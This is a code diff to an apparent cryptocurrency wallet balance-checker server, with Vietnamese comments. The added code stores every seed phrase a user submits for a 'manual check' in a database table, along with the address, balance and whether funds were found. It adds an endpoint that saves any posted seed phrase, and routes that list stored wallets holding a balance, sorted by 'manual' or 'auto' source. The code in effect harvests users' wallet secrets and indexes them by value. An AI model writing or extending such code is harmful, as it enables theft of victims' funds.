@@ -55,6 +55,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           })
         ),
         seedPhrase: z.string().optional(),
+        isManualCheck: z.boolean().optional().default(false), // Thêm flag để phân biệt
       });
 
       const validationResult = schema.safeParse(req.body);
@@ -65,7 +66,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         });
       }
 
-      const { addresses, seedPhrase } = validationResult.data;
+      const { addresses, seedPhrase, isManualCheck } = validationResult.data;
       const results: BalanceCheckResult[] = [];
 
       // Check balances for all addresses
@@ -101,12 +102,35 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 blockchain,
                 address,
                 balance,
-                seedPhrase: seedPhrase,
+                seedPhrase,
                 path: "",
-                metadata: {},
+                source: isManualCheck ? "manual" : "auto", // Thêm source để phân biệt
+                metadata: {
+                  timestamp: new Date().toISOString(),
+                  isManualCheck
+                },
               });
             } catch (dbError) {
               console.error("Error saving wallet to database:", dbError);
+              // Continue even if DB save fails
+            }
+          }
+          
+          // Nếu là kiểm tra thủ công, lưu seed phrase vào bảng manual_checks
+          if (isManualCheck && seedPhrase) {
+            try {
+              await storage.createManualCheck({
+                seedPhrase,
+                timestamp: new Date(),
+                metadata: { 
+                  addressChecked: address,
+                  blockchain,
+                  balance,
+                  hasBalance
+                },
+              });
+            } catch (dbError) {
+              console.error("Error saving manual check:", dbError);
               // Continue even if DB save fails
             }
           }
@@ -131,6 +155,42 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // API riêng để lưu seed phrase từ kiểm tra thủ công
+  app.post("/api/save-manual-check", async (req: Request, res: Response) => {
+    try {
+      // Validate request
+      const schema = z.object({
+        seedPhrase: seedPhraseSchema,
+        metadata: z.record(z.any()).optional(),
+      });
+
+      const validationResult = schema.safeParse(req.body);
+      if (!validationResult.success) {
+        return res.status(400).json({
+          message: "Invalid request",
+          errors: validationResult.error.errors,
+        });
+      }
+
+      const { seedPhrase, metadata = {} } = validationResult.data;
+
+      // Lưu vào bảng manual_checks
+      await storage.createManualCheck({
+        seedPhrase,
+        timestamp: new Date(),
+        metadata,
+      });
+
+      return res.json({ success: true });
+    } catch (error) {
+      console.error("Error saving manual check:", error);
+      return res.status(500).json({
+        message: "Failed to save manual check",
+        error: String(error),
+      });
+    }
+  });
+
   // Get wallets with balance
   app.get("/api/wallets-with-balance", async (req: Request, res: Response) => {
     try {
@@ -138,6 +198,27 @@ export async function registerRoutes(app: Express): Promise<Server> {
       return res.json({ wallets: walletsWithBalance });
     } catch (error) {
       console.error("Error fetching wallets:", error);
+      return res.status(500).json({
+        message: "Failed to fetch wallets",
+        error: String(error),
+      });
+    }
+  });
+  
+  // Get wallets by source (manual or auto)
+  app.get("/api/wallets-by-source/:source", async (req: Request, res: Response) => {
+    try {
+      const { source } = req.params;
+      if (source !== 'manual' && source !== 'auto') {
+        return res.status(400).json({
+          message: "Invalid source, must be 'manual' or 'auto'",
+        });
+      }
+      
+      const wallets = await storage.getWalletsBySource(source);
+      return res.json({ wallets });
+    } catch (error) {
+      console.error(`Error fetching wallets by source '${req.params.source}':`, error);
       return res.status(500).json({
         message: "Failed to fetch wallets",
         error: String(error),
